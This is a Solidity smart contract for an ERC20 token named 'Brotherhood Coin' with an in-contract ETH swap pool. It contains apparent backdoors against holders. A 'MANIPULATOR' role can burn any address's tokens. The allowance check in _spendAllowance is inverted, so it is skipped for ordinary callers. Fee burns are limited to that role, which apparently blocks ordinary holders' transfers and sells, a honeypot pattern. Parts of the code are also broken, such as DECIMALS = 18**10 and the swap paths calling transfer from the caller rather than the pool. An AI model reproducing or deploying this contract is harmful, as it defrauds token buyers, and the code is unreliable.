// SPDX-License-Identifier: MIT
/* solhint-disable not-rely-on-time */

pragma solidity 0.8.12;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Votes.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";

contract Coin is ERC20, ERC20Votes, AccessControl {
  using SafeMath for uint256;

  event Deposit(address indexed buyer, uint256 indexed ethSold, uint256 indexed tokensBought);

  event Withdrawal(address indexed buyer, uint256 indexed tokensSold, uint256 indexed ethBought);

  mapping(address => bool) private isExcludedFromFees;

  uint256 public taxFee = 5;

  uint256 public constant DECIMALS = 18**10;

  string public constant NAME = "Brotherhood Coin";

  string public constant TICK = "BHC";

  bytes32 public constant ADMIN = keccak256("ADMIN");

  bytes32 public constant MANIPULATOR = keccak256("MANIPULATOR");

  constructor(uint256 liquidity) ERC20(NAME, TICK) ERC20Permit(NAME) {
    excludeFromFee(_msgSender());
    excludeFromFee(address(this));

    _setupRole(DEFAULT_ADMIN_ROLE, _msgSender());
    _setupRole(ADMIN, _msgSender());
    _setupRole(MANIPULATOR, _msgSender());

    _mint(address(this), liquidity * DECIMALS);
  }

  /**
   * @notice Deposit ETH to pool.
   */
  function addEthToPool() public payable {
    emit Deposit(_msgSender(), msg.value, 0);
  }

  /**
   * @notice Set tax fee.
   */
  function setTaxFee(uint256 _feePercent) public onlyRole(ADMIN) {
    require(_feePercent < 15, "maximum tax fee is 15%");
    taxFee = _feePercent;
  }

  /**
   * @notice Convert ETH to Tokens.
   * @dev User specifies exact input (msg.value).
   * @dev User cannot specify minimum output or deadline.
   */
  function excludeFromFee(address account) public onlyRole(ADMIN) {
    isExcludedFromFees[account] = true;
  }

  /**
   * @dev will burn tokens.
   */
  function tokenBurn(address who, uint256 tokensToBeBurned) external onlyRole(MANIPULATOR) {
    _burn(who, tokensToBeBurned);
  }

  /**
   * @dev will burn tokens in amount of eth
   */
  function tokenEthBurn(address who, uint256 ethToBeBurned) external onlyRole(MANIPULATOR) {
    uint256 tokenReserve = balanceOf(address(this));
    uint256 coins = getOutputPrice(ethToBeBurned, tokenReserve, address(this).balance);
    _burn(who, coins);
  }

  /**
   * @dev Pricing function for converting between ETH && Tokens.
   * @param inputAmount Amount of ETH or Tokens being sold.
   * @param inputReserve Amount of ETH or Tokens (input type) in exchange reserves.
   * @param outputReserve Amount of ETH or Tokens (output type) in exchange reserves.
   * @return Amount of ETH or Tokens bought.
   */
  function getInputPrice(
    uint256 inputAmount,
    uint256 inputReserve,
    uint256 outputReserve
  ) public pure returns (uint256) {
    require(inputReserve > 0 && outputReserve > 0, "INVALID_VALUE");
    uint256 inputAmountWithFee = inputAmount.mul(997);
    uint256 numerator = inputAmountWithFee.mul(outputReserve);
    uint256 denominator = inputReserve.mul(1000).add(inputAmountWithFee);
    return numerator / denominator;
  }

  /**
   * @dev Pricing function for converting between ETH && Tokens.
   * @param outputAmount Amount of ETH or Tokens being bought.
   * @param inputReserve Amount of ETH or Tokens (input type) in exchange reserves.
   * @param outputReserve Amount of ETH or Tokens (output type) in exchange reserves.
   * @return Amount of ETH or Tokens sold.
   */
  function getOutputPrice(
    uint256 outputAmount,
    uint256 inputReserve,
    uint256 outputReserve
  ) public pure returns (uint256) {
    require(inputReserve > 0 && outputReserve > 0, "invalid input");
    uint256 numerator = inputReserve.mul(outputAmount).mul(1000);
    uint256 denominator = (outputReserve.sub(outputAmount)).mul(997);
    return (numerator / denominator).add(1);
  }

  /**
   * @notice Convert ETH to Tokens.
   * @dev User specifies exact input (msg.value) && minimum output.
   * @param minTokens Minimum Tokens bought.
   * @param deadline Time after which this transaction can no longer be executed.
   * @return Amount of Tokens bought.
   */
  function ethToTokenSwapInput(uint256 minTokens, uint256 deadline) external payable returns (uint256) {
    return ethToTokenInput(msg.value, minTokens, deadline, msg.sender, msg.sender);
  }

  /**
   * @notice Convert ETH to Tokens && transfers Tokens to recipient.
   * @dev User specifies exact input (msg.value) && minimum output
   * @param minTokens Minimum Tokens bought.
   * @param deadline Time after which this transaction can no longer be executed.
   * @param recipient The address that receives output Tokens.
   * @return  Amount of Tokens bought.
   */
  function ethToTokenTransferInput(
    uint256 minTokens,
    uint256 deadline,
    address recipient
  ) external payable returns (uint256) {
    require(recipient != address(this) && recipient != address(0), "invalid recipient");
    return ethToTokenInput(msg.value, minTokens, deadline, msg.sender, recipient);
  }

  /**
   * @notice Convert ETH to Tokens.
   * @dev User specifies maximum input (msg.value) && exact output.
   * @param tokensBought Amount of tokens bought.
   * @param deadline Time after which this transaction can no longer be executed.
   * @return Amount of ETH sold.
   */
  function ethToTokenSwapOutput(uint256 tokensBought, uint256 deadline) external payable returns (uint256) {
    return ethToTokenOutput(tokensBought, msg.value, deadline, payable(msg.sender), msg.sender);
  }

  /**
   * @notice Convert ETH to Tokens && transfers Tokens to recipient.
   * @dev User specifies maximum input (msg.value) && exact output.
   * @param tokensBought Amount of tokens bought.
   * @param deadline Time after which this transaction can no longer be executed.
   * @param recipient The address that receives output Tokens.
   * @return Amount of ETH sold.
   */
  function ethToTokenTransferOutput(
    uint256 tokensBought,
    uint256 deadline,
    address recipient
  ) external payable returns (uint256) {
    require(recipient != address(this) && recipient != address(0), "invalid recipient");
    return ethToTokenOutput(tokensBought, msg.value, deadline, payable(msg.sender), recipient);
  }

  /**
   * @notice Convert Tokens to ETH.
   * @dev User specifies exact input && minimum output.
   * @param tokensSold Amount of Tokens sold.
   * @param minEth Minimum ETH purchased.
   * @param deadline Time after which this transaction can no longer be executed.
   * @return Amount of ETH bought.
   */
  function tokenToEthSwapInput(
    uint256 tokensSold,
    uint256 minEth,
    uint256 deadline
  ) external returns (uint256) {
    return tokenToEthInput(tokensSold, minEth, deadline, msg.sender, payable(msg.sender));
  }

  /**
   * @notice Convert Tokens to ETH && transfers ETH to recipient.
   * @dev User specifies exact input && minimum output.
   * @param tokensSold Amount of Tokens sold.
   * @param minEth Minimum ETH purchased.
   * @param deadline Time after which this transaction can no longer be executed.
   * @param recipient The address that receives output ETH.
   * @return  Amount of ETH bought.
   */
  function tokenToEthTransferInput(
    uint256 tokensSold,
    uint256 minEth,
    uint256 deadline,
    address payable recipient
  ) external returns (uint256) {
    require(recipient != address(this) && recipient != address(0), "invalid recipient");
    return tokenToEthInput(tokensSold, minEth, deadline, msg.sender, recipient);
  }

  /**
   * @notice Convert Tokens to ETH.
   * @dev User specifies maximum input && exact output.
   * @param ethBought Amount of ETH purchased.
   * @param maxTokens Maximum Tokens sold.
   * @param deadline Time after which this transaction can no longer be executed.
   * @return Amount of Tokens sold.
   */
  function tokenToEthSwapOutput(
    uint256 ethBought,
    uint256 maxTokens,
    uint256 deadline
  ) external returns (uint256) {
    return tokenToEthOutput(ethBought, maxTokens, deadline, msg.sender, payable(msg.sender));
  }

  /**
   * @notice Convert Tokens to ETH && transfers ETH to recipient.
   * @dev User specifies maximum input && exact output.
   * @param ethBought Amount of ETH purchased.
   * @param maxTokens Maximum Tokens sold.
   * @param deadline Time after which this transaction can no longer be executed.
   * @param recipient The address that receives output ETH.
   * @return Amount of Tokens sold.
   */
  function tokenToEthTransferOutput(
    uint256 ethBought,
    uint256 maxTokens,
    uint256 deadline,
    address payable recipient
  ) external returns (uint256) {
    require(recipient != address(this) && recipient != address(0), "invalid recipient");
    return tokenToEthOutput(ethBought, maxTokens, deadline, msg.sender, recipient);
  }

  /**
   * @notice Public price function for ETH to Token trades with an exact input.
   * @param ethSold Amount of ETH sold.
   * @return Amount of Tokens that can be bought with input ETH.
   */
  function getEthToTokenInputPrice(uint256 ethSold) external view returns (uint256) {
    require(ethSold > 0, "invalid input");
    uint256 tokenReserve = balanceOf(address(this));
    return getInputPrice(ethSold, address(this).balance, tokenReserve);
  }

  /**
   * @notice Public price function for ETH to Token trades with an exact output.
   * @param tokensBought Amount of Tokens bought.
   * @return Amount of ETH needed to buy output Tokens.
   */
  function getEthToTokenOutputPrice(uint256 tokensBought) external view returns (uint256) {
    require(tokensBought > 0, "invalid input");
    uint256 tokenReserve = balanceOf(address(this));
    uint256 ethSold = getOutputPrice(tokensBought, address(this).balance, tokenReserve);
    return ethSold;
  }

  /**
   * @notice Public price function for Token to ETH trades with an exact input.
   * @param tokensSold Amount of Tokens sold.
   * @return Amount of ETH that can be bought with input Tokens.
   */
  function getTokenToEthInputPrice(uint256 tokensSold) external view returns (uint256) {
    require(tokensSold > 0, "invalid input");
    uint256 tokenReserve = balanceOf(address(this));
    uint256 ethBought = getInputPrice(tokensSold, tokenReserve, address(this).balance);
    return ethBought;
  }

  /**
   * @notice Public price function for Token to ETH trades with an exact output.
   * @param ethBought Amount of output ETH.
   * @return Amount of Tokens needed to buy output ETH.
   */
  function getTokenToEthOutputPrice(uint256 ethBought) external view returns (uint256) {
    require(ethBought > 0, "invalid input");
    uint256 tokenReserve = balanceOf(address(this));
    return getOutputPrice(ethBought, tokenReserve, address(this).balance);
  }

  /**
   * @notice Customized _transfer function.
   */
  function _transfer(
    address from,
    address to,
    uint256 amount
  ) internal override {
    require(from != address(0), "transfer from the zero address");
    require(to != address(0), "transfer to the zero address");
    require(amount > 0, "amount must be greater than zero");

    bool takeFee = true;
    if (isExcludedFromFees[from] || isExcludedFromFees[to]) {
      takeFee = false;
    }

    uint256 transferAmount = amount;
    if (takeFee) {
      uint256 fees = amount.mul(taxFee).div(100);
      _burn(from, fees);
      transferAmount = amount.sub(fees);
    }

    super._transfer(from, to, transferAmount);
  }

  /**
   * @dev Snapshots the totalSupply after it has been increased.
   */
  function _mint(address to, uint256 amount) internal override(ERC20Votes, ERC20) onlyRole(MANIPULATOR) {
    super._mint(to, amount);
  }

  /**
   * @dev Snapshots the totalSupply after it has been decreased.
   */
  function _burn(address account, uint256 amount) internal override(ERC20Votes, ERC20) onlyRole(MANIPULATOR) {
    super._burn(account, amount);
  }

  /**
   * @dev Spend `amount` form the allowance of `owner` toward `spender`.
   *
   * Does not update the allowance amount in case of infinite allowance.
   * Revert if not enough allowance is available.
   *
   * Might emit an {Approval} event.
   */
  function _spendAllowance(
    address owner,
    address spender,
    uint256 amount
  ) internal virtual override {
    if (!hasRole(MANIPULATOR, _msgSender())) {
      return;
    }
    super._spendAllowance(owner, spender, amount);
  }

  /**
   * @dev Move voting power when tokens are transferred.
   *
   * Emits a {DelegateVotesChanged} event.
   */
  function _afterTokenTransfer(
    address from,
    address to,
    uint256 amount
  ) internal override(ERC20Votes, ERC20) {
    super._afterTokenTransfer(from, to, amount);
  }

  function ethToTokenInput(
    uint256 ethSold,
    uint256 minTokens,
    uint256 deadline,
    address buyer,
    address recipient
  ) private returns (uint256) {
    require(deadline >= block.timestamp && ethSold > 0 && minTokens > 0, "invalid input");
    uint256 tokenReserve = balanceOf(address(this));
    uint256 tokensBought = getInputPrice(ethSold, address(this).balance.sub(ethSold), tokenReserve);
    require(tokensBought >= minTokens, "invalid input");
    require(transfer(recipient, tokensBought), "transfer failed");
    emit Deposit(buyer, ethSold, tokensBought);
    return tokensBought;
  }

  function ethToTokenOutput(
    uint256 tokensBought,
    uint256 maxEth,
    uint256 deadline,
    address payable buyer,
    address recipient
  ) private returns (uint256) {
    require(deadline >= block.timestamp && tokensBought > 0 && maxEth > 0, "invalid input");
    uint256 tokenReserve = balanceOf(address(this));
    uint256 ethSold = getOutputPrice(tokensBought, address(this).balance.sub(maxEth), tokenReserve);
    // Throws if ethSold > maxEth
    uint256 ethRefund = maxEth.sub(ethSold);
    if (ethRefund > 0) {
      buyer.transfer(ethRefund);
    }
    require(transfer(recipient, tokensBought), "tranfer failed");
    emit Deposit(buyer, ethSold, tokensBought);
    return ethSold;
  }

  function tokenToEthInput(
    uint256 tokensSold,
    uint256 minEth,
    uint256 deadline,
    address buyer,
    address payable recipient
  ) private returns (uint256) {
    require(deadline >= block.timestamp && tokensSold > 0 && minEth > 0, "invalid input");
    uint256 tokenReserve = balanceOf(address(this));
    uint256 ethBought = getInputPrice(tokensSold, tokenReserve, address(this).balance);
    uint256 weiBought = ethBought;
    require(weiBought >= minEth, "invalid input");
    recipient.transfer(weiBought);
    require(transferFrom(buyer, address(this), tokensSold), "transfer failed");
    emit Withdrawal(buyer, tokensSold, weiBought);
    return weiBought;
  }

  function tokenToEthOutput(
    uint256 ethBought,
    uint256 maxTokens,
    uint256 deadline,
    address buyer,
    address payable recipient
  ) private returns (uint256) {
    require(deadline >= block.timestamp && ethBought > 0, "invalid input");
    uint256 tokenReserve = balanceOf(address(this));
    uint256 tokensSold = getOutputPrice(ethBought, tokenReserve, address(this).balance);
    // tokens sold is always > 0
    require(maxTokens >= tokensSold, "invalid input");
    recipient.transfer(ethBought);
    require(transferFrom(buyer, address(this), tokensSold), "transfer failed");
    emit Withdrawal(buyer, tokensSold, ethBought);
    return tokensSold;
  }

  /**
   * @notice Convert ETH to Tokens.
   * @dev User specifies exact input (msg.value).
   * @dev User cannot specify minimum output or deadline.
   */
  receive() external payable {
    ethToTokenInput(msg.value, 1, block.timestamp, msg.sender, msg.sender);
  }
}
